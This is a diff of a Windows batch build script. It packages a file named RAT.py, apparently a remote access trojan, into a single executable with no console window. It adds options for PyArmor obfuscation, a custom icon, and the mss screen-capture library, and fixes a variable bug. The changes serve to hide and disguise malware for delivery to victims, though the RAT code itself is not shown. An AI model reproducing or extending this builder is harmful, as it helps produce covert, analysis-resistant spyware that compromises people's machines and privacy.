@@ -214,19 +214,28 @@ copy "modules\*.*" ..\"!folder!"
 cd modules
 
 set "main_arg=pyinstaller --onefile --noconsole --icon=custom_icon.ico --hidden-import mss"
+set "main_arg3=pyarmor pack --clean -e " --onefile --noconsole --icon=custom_icon.ico --hidden-import mss"
+
 set "main_arg2=pyinstaller --onefile --noconsole --hidden-import mss"
+set "main_arg4=pyarmor pack -e " --onefile --noconsole --hidden-import mss"
+
 for %%i in (*) do set "main_arg=!main_arg! --add-data %%~nxi;."
 for %%i in (*) do set "main_arg2=!main_arg2! --add-data %%~nxi;."
+for %%i in (*) do set "main_arg3=!main_arg3! --add-data %%~nxi;."
+for %%i in (*) do set "main_arg4=!main_arg4! --add-data %%~nxi;."
+
 set "main_arg=!main_arg! RAT.py"
-set "main_arg2=!main_arg! RAT.py"
+set "main_arg2=!main_arg2! RAT.py"
+set "main_arg3=!main_arg3! " RAT.py"
+set "main_arg4=!main_arg4! " RAT.py"
 
 cd "%~dp0!folder!"
 
 if "!pyarmor!"=="yes" (
 	if "!icon!"=="yes" (
-		pyarmor pack -e " --onefile --noconsole --icon=custom_icon.ico " RAT.py
+		!main_arg3!
 	) else (
-		pyarmor pack -e " --onefile --noconsole " RAT.py
+		!main_arg4!
 	)
 ) else (
 	if "!icon!"=="yes" (
